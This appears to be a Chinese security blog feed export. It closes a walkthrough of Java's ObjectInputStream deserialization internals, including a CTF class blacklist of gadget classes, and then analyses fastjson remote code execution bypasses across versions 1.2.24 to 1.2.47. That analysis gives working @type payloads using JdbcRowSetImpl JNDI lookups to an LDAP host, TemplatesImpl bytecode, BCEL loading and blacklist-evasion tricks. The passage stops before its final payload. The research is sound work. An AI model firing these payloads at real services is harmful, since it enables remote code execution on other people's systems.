<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910230103059.png" alt="image-20230910230103059"></p>
<p>这次调用的是peekByte()，所以读取下一个字节114，进入TO_CLASSDESC处理类对象 (现在等于是在TC_OBJECT 对象数据中处理TO_CLASSDESC类数据)</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910230556731.png" alt="image-20230910230556731"></p>
<p>进入<code>readNonProxyDesc()</code>，主要分为两部<code>readClassDescriptor()</code>和<code>resolveClass()</code></p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910230950256.png" alt="image-20230910230950256"></p>
<p>先看<code>readClassDescriptor()</code>，里边又执行了<code>readNonProxy()</code>，主要是拿到类中的两个字段——&gt;cat、dog</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910231235708.png" alt="image-20230910231235708"></p>
<p>取出后回到<code>readNonProxyDesc()</code>，将<code>readClassDescriptor()</code>获取到的类及其字段返回给readDesc属性，通过<code>resolveClass()</code>默认类加载器加载了readDesc指定名称的类即Animals，并触发类的初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着回到<code>readOrdinaryObject()</code>，将刚才加载的类赋值给desc，并判断其是否可以进行反序列化，接着通过forClass拿到目标class对象</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910231704288.png" alt="image-20230910231704288"></p>
<p>下边执行<code>isInstantiable()</code>判断其是否可以进行实例化，之后实例化了desc，这时obj就成为了真正的<code>Animals</code>对象。(这里有个单例问题后边再说)</p>
<p>Animals实例创建好之后，还需要对其中的每个字段进行填充，相关操作体现在readSerialData方法中</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910232845616.png" alt="image-20230910232845616"></p>
<p><code>readSerialData</code>方法有两种情况：</p>
<p>这个方法首先会对通过<code>hasReadObjectMethod()</code>对传入的对应描述符对象进行判断，看其是否存在<code>readObjectMethod</code>属性，存在就通过反射调用</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910233216207.png" alt="image-20230910233216207"></p>
<p>而我们在Animals类中并没有重写<code>readOject()</code>，所以走到了下边else中的<code>defaultReadFields()</code></p>
<p>其中通过反序列化读取到各字段的值，并反射对其进行填充，此刻obj对象实例，已经有了对应的字段和值</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910233647638.png" alt="image-20230910233647638"></p>
<h3 id="单例问题"><a href="#单例问题" class="headerlink" title="单例问题"></a>单例问题</h3><p>走出<code>readSerialData()</code>后，就到了下边的<code>hasReadResolveMethod</code>()，判断是否有<code>ReadResolve</code>方法</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910233905584.png" alt="image-20230910233905584"></p>
<p>而这个方法其实就是为了解决单例问题的，在前边有这么一段代码，当调用newInstance()进行实例化后，此时JVM会为其创建一个新的实例对象，这种做法会破坏单例模式。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br></pre></td></tr></table></figure>

<p>所以可以用<code>readResolve()</code>解决这个问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Animals</span>();   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然这个对当前反序列化没有影响，所以了解下即可，可参考：<a href="https://zhuanlan.zhihu.com/p/136769959">单例、序列化和readResolve()方法 - 知乎 (zhihu.com)</a></p>
<h1 id="重写readObejct"><a href="#重写readObejct" class="headerlink" title="重写readObejct"></a>重写readObejct</h1><p>在上边提到<code>readSerialData()</code>有两种情况，分别是调用<code>readObject()</code>和<code>defaultReadFields()</code>填充字段，所以这里看下重写<code>readOject()</code>后会怎样</p>
<p>在Animals类中加上：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前边都是一样的所以就不看了，直接到<code>readSerialData()</code>里，由于这次已经有了<code>readOject()</code>方法，所以在<code>hasReadObjectMethod()</code>判断结束后，进入了if语句，反射调用了重写的<code>readObject()</code></p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910234840705.png" alt="image-20230910234840705"></p>
<p>由于我们没有在<code>readObejct()</code>中，并没有写<code>readUTF()</code>或其他实例化语句，所以这里并没有对属性进行填充，就导致了：</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910235433620.png" alt="image-20230910235433620"></p>
<p>这时就引出了<code>defaultReadObject()</code></p>
<h1 id="defaultReadObject"><a href="#defaultReadObject" class="headerlink" title="defaultReadObject"></a>defaultReadObject</h1><p>defaultReadObject其实在重写的readOject方法中很多都有见过</p>
<p>根据注解，作用主要是：从该流中读取当前类的非静态和非瞬态字段。这只能从正在反序列化的类的readObject方法调用。</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230908135654928.png" alt="image-20230908135654928"></p>
<p>其实就是对各个字段值进行初始化，<code>defaultReadObject()</code> 主要执行以下操作：</p>
<ol>
<li>根据默认的规则从输入流中读取字节流，将其转换为对象的字段值。</li>
<li>将读取到的字段值分配给相应的字段。</li>
</ol>
<h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><p> 将<code>readObject()</code>改成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是到之前反射调用<code>readOject()</code>的部分，这时执行了<code>defaultReadObject()</code></p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910235717113.png" alt="image-20230910235717113"></p>
<p>之后执行到了<code>defaultReadFields()</code>，在上边字段填充中提到过，剩下过程就跟之前一样了</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910235817757.png" alt="image-20230910235817757"></p>
<p>此时执行后的结果：</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910235953222.png" alt="image-20230910235953222"></p>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><p>在CTF中，有通过对<code>Resolve()</code>重写，进行二次反序列化的利用，如：<a href="https://github.com/waderwu/javaDeserializeLabs">javaDeserializeLabs — labs5</a>、AliyunCTF — ezbean</p>
<p>除此外还见过一次通过<code>resolveClass</code>设置拦截点的题，做个简单记录</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyownObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ArrayList Blacklist=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyownObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(Hashtable.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(HashSet.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(TreeMap.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(XString.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());</span><br><span class="line">        <span class="built_in">this</span>.Blacklist.add(ToStringBean.class.getName());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.Blacklist.contains(desc.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;dont do this&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 看我一命通关</title>
    <url>/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​        Fastjson是一款由阿里巴巴开发的高性能、功能丰富的 JSON 处理库，用于实现Java 对象和 JSON 字符串的转换。而Fastjson组件提供的反序列化功能，允许用户通过”@type” 字段来指定任意反序列化类名，并自动调用该类的 setter 方法及部分 getter 方法，这就导致当反序列化不可信数据时便可触发远程代码执行。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson -1.2.24"></a>fastjson -1.2.24</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.24</p>
<p>主要利用方式为：</p>
<ul>
<li>JdbcRowSetImpl 结合JNDI注入</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>TemplatesImpl 动态加载字节码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">	<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;S1nJa&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">	<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>BasicDataSource 不出网利用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体利用过程就不在赘述了，主要看下其他版本的绕过方式和利用思路。</p>
<h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson -1.2.25"></a>fastjson -1.2.25</h2><p>在1.2.25版本中，官方引入了一个安全机制<code>checkAutoType</code>，主要进行了黑白名单检测，上述利用方式都被加入到了黑名单中</p>
<ul>
<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41</li>
<li>autotype：开启</li>
</ul>
<h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h3><p>其中有这三个属性，分别代表是否开启checkAutoType和黑白名单，autoTypeSupport默认为false</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023144815106.png" alt="image-20231023144815106"></p>
<p>接着就看下<code>checkAutoType</code>具体做了什么，之前的版本中是通过TypeUtils.loadClass直接加载我们传入的类，并通过deserialze进行反序列化</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140209718.png" alt="image-20231023140209718"></p>
<p>1.2.25开始加入了checkAutoType进行安全检测</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140809796.png" alt="image-20231023140809796"></p>
<h4 id="开启AutoType"><a href="#开启AutoType" class="headerlink" title="开启AutoType"></a>开启AutoType</h4><p>开启autoType的模式下先进行白名单检测如果有就直接加载，没有在进行黑名单检测，不在黑名单的话会从mapping缓存中查找</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145135164.png" alt="image-20231023145135164"></p>
<p>最后如果还没有则会直接加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关闭AutoType"><a href="#关闭AutoType" class="headerlink" title="关闭AutoType"></a>关闭AutoType</h4><p>关闭的逻辑是先黑再白，如果还是找不到就抛出异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145554242.png" alt="image-20231023145554242"></p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>JdbcRowSetImpl、TemplatesImpl、BCEL(sun包下的所有内容)都被加入了黑名单，看似无法再使用，但在loadClass的逻辑中发现这么一段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果类名以L 开头; 结尾，则会递归的去除该符号，而这就出现了一个逻辑漏洞，<code>com.sun.*</code>被加入了黑名单，但是<code>Lcom.sun.*;</code>并没有，利用这个机制就可以绕过黑名单检测</p>
<p>而这需要开启autotype，在上边的逻辑中有提到，如果黑白名单和mapping缓存中都没有该类则会调用如下代码直接加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若没有开启autotype黑白名单中没有则会直接抛出异常</p>
<p>最终的 payload 在类名前后加上<code>L</code>和<code>;</code>即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson -1.2.42"></a>fastjson -1.2.42</h2><ul>
<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</li>
<li>autotype：开启</li>
</ul>
<p>自1.2.42开始，checkAutoType做了两个变化：</p>
<p>1、黑名单采用hash形式，防止安全人员对其研究。不过很多都已经被师傅们撞出来了:<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a></p>
<img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023151856492.png" alt="image-20231023151856492" style="zoom: 67%;">

<p>2、在开头部分加了L和;判断</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023152207413.png" alt="image-20231023152207413"></p>
<p>这种方式只是表面上防止了L开头;结尾的情况，但loadClass中的逻辑是递归解析，所以这里双写绕过即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson -1.2.43"></a>fastjson -1.2.43</h2><ul>
<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</li>
<li>autotype：开启</li>
</ul>
<p>自1.2.43开始，又对之前的漏洞进行了修复，这次修复的方式为：如果出现LL则直接抛出异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023153431821.png" alt="image-20231023153431821"></p>
<p>但loadClass中还有另一段逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果以[开头，也会进行截断解析，所以便可构造Payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但遇到报错:</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023160059692.png" alt="image-20231023160059692"></p>
<h3 id="畸形payload"><a href="#畸形payload" class="headerlink" title="畸形payload"></a>畸形payload</h3><p>上边报错希望42行的位置是[，但却是逗号，所以加上[</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后报错希望43行为{</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023161826856.png" alt="image-20231023161826856"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在成功运行了</p>
<p>分析下原因，先看下逗号前添加 “[“ 的逻辑</p>
<p>在deserialze中先获取ComponentType型的数据，这个数据就是截取”[“后的实体类，接着调用parseArray进行解析</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023163713012.png" alt="image-20231023163713012"></p>
<p>先获取token，如果值不是14就会抛出刚才的异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164100641.png" alt="image-20231023164100641"></p>
<p>所以问题在于前边解析lexer中token的时候发生的，逻辑就在DefaultJSONParser中，lexer是fastjson中的一个词法解析器，它希望下一次解析内容为<code>JSONToken.COMMA</code>也就是逗号前的内容</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164600475.png" alt="image-20231023164600475"></p>
<p>之后如果逗号前的内容是[，就会返回token值14，便不再会抛出异常</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023165046308.png" alt="image-20231023165046308"></p>
<p>逗号前是”{“同理，逻辑在JavaBeanDeserializer#deserialze，可以自行分析下</p>
<p>所以最终的payload为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但该漏洞在1.2.44修复了，修复方式仍然是黑名单抛异常</p>
<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson -1.2.47"></a>fastjson -1.2.47</h2><p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞—Cache通杀，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code></p>
<p>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p>
<p>autotype：1.2.32前关闭，1.2.33—1.2.47均可</p>
<p>到此黑名单已经设置的比较严格了，在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，没有其它的绕过方式，于是思路就转变到了在判断autoTypeSupport 前找调用链</p>
<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>autoTypeSupport 前有两个可以加载类的部分，分别是从mappings缓存和deserializers中获取</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023180320857.png" alt="image-20231023180320857"></p>
<p>先看下deserializers是否可控，它是一个IdentityHashMap对象，对其进行赋值的函数有</p>
<ul>
<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
</ul>
<p>因此就无法通过修改deserializers的方式获取类了，接着看哪里能赋值<code>mappings</code>，于是找到了TypeUtils的loadClass，当cache为true时就会将传入的className存储到mappings中</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181153428.png" alt="image-20231023181153428"></p>
<p>而在MiscCodec的deserialze有对应的调用，会把strVal存入mappings中</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181457849.png" alt="image-20231023181457849"></p>
<p>所以接下来的任务就是：</p>
<ol>
<li>找到某个类调用MiscCodec#deserialze</li>
<li>判断strVal是否可控</li>
</ol>
<h4 id="MiscCodec-deserialze"><a href="#MiscCodec-deserialze" class="headerlink" title="MiscCodec#deserialze"></a>MiscCodec#deserialze</h4><p>在fastjson执行反序列化前，会调用<code>getDeserializer()</code>寻找适合的反序列化器</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182235940.png" alt="image-20231023182235940"></p>
<p>而反序列化器是从deserializers获取的，deserializers又在初始化中添加了MiscCodec这个类，所以只需要我们传入的类为Class.class即可，即：<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;a&quot;:&quot;aaa&quot;&#125;</code></p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182407922.png" alt="image-20231023182407922"></p>
<h4 id="strVal"><a href="#strVal" class="headerlink" title="strVal"></a>strVal</h4><p>strVal的值是objVal赋过去的，而objVal的值则是解析json中的val属性的值</p>
<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023183156083.png" alt="image-20231023183156083"></p>
<p>现在这样就能将JdbcRowSetImpl类存到mappings中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于fastjson是循环解析json数据，所以只需要在构造一段触发恶意类的json数据即可，payload：</p>
